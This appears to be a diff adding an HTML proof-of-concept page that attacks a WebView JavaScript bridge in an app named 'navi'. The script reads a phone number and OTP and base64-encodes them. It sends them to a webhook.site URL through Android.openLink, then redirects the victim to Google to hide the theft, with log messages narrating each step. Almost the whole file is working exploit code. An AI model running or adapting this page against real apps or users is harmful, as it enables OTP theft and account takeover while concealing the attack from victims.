@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>🎥 LIVE Attack Demonstration</h2>
+    
+    <div style="background:#000;color:#0f0;padding:20px;font-family:monospace;">
+        <div id="log">
+&gt; Navi WebView Attack Initialized<br>
+&gt; Ready to demonstrate data theft<br>
+&gt; <br>
+&gt; Enter credentials below:<br>
+        </div>
+    </div>
+    
+    <div style="margin:20px 0;">
+        <input type="text" id="victimPhone" placeholder="Phone" value="9876543210"><br>
+        <input type="password" id="victimOTP" placeholder="OTP" value="123456"><br>
+        <button onclick="liveAttack()" style="background:red;color:white;padding:10px;margin:10px 0;">
+            🚨 DEMO: Steal & Redirect
+        </button>
+    </div>
+    
+    <script>
+        const log = document.getElementById('log');
+        
+        function addLog(msg) {
+            log.innerHTML += `&gt; ${msg}<br>`;
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        function liveAttack() {
+            const phone = document.getElementById('victimPhone').value;
+            const otp = document.getElementById('victimOTP').value;
+            
+            addLog('='.repeat(50));
+            addLog('🚀 ATTACK SEQUENCE STARTED');
+            addLog('='.repeat(50));
+            
+            if (typeof Android !== 'undefined' && Android.openLink) {
+                // Step 1: Show what's being stolen
+                addLog(`[1/3] Capturing credentials:`);
+                addLog(`   Phone: ${phone}`);
+                addLog(`   OTP: ${otp}`);
+                
+                // Step 2: Show data being sent
+                setTimeout(() => {
+                    addLog(`[2/3] Sending to attacker server:`);
+                    
+                    const stolenData = {
+                        phone: phone,
+                        otp: otp,
+                        app: 'navi',
+                        exploit: 'webview_js_bridge',
+                        time: new Date().toLocaleTimeString()
+                    };
+                    
+                    // Encode and send
+                    const encoded = btoa(JSON.stringify(stolenData));
+                    const attackerURL = `https://webhook.site/geeky?data=${encoded}`;
+                    
+                    addLog(`   URL: ${attackerURL.substring(0, 70)}...`);
+                    addLog(`   ✅ Data sent! Check webhook.site`);
+                    
+                    Android.openLink(attackerURL);
+                    
+                    // Step 3: Show redirect
+                    setTimeout(() => {
+                        addLog(`[3/3] Hiding attack (redirect to Google):`);
+                        addLog(`   Executing: Android.openLink('https://google.com')`);
+                        
+                        Android.openLink('https://google.com');
+                        
+                        addLog('='.repeat(50));
+                        addLog('✅ ATTACK COMPLETE');
+                        addLog('   • Credentials stolen');
+                        addLog('   • Data sent to attacker');
+                        addLog('   • Victim sees Google (normal)');
+                        addLog('='.repeat(50));
+                        
+                    }, 1500);
+                    
+                }, 1000);
+                
+            } else {
+                addLog('❌ Android bridge not available');
+            }
+        }
+        
+        // Initial detection
+        if (typeof Android !== 'undefined') {
+            addLog('✅ Android JS Bridge detected');
+            addLog('Ready for attack demonstration');
+        }
+    </script>
+</body>
+</html>
